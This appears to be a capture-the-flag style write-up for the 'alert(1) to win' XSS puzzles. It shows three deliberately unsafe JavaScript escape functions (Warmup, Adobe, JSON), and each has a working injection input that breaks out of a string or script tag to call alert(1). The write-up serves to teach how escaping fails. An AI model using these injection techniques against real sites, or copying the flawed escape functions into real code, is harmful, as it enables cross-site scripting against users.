# alert(1) to win

[alf.nu/alert(1)](<https://alf.nu/alert(1)>)

> The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

## Warmup ✅

```js
function escape(s) {
  return '<script>console.log("' + s + '");</script>';
}
```

#### Input (12)

```
",alert(1),"
```

#### Output

```html
<script>console.log("",alert(1),"");</script>
```

## Adobe ✅

```js
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

#### Input (14)

```
\",alert(1))//
```

#### Output

```html
<script>console.log("\\",alert(1))//");</script>
```

## JSON ✅

```js
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

#### Input (27)

```
</script><script>alert(1)//
```

#### Output

```html
<script>console.log("</script><script>alert(1)//");</script>
```
